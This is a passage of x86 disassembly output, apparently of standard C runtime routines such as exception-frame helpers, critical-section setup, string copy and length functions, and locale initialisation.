  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
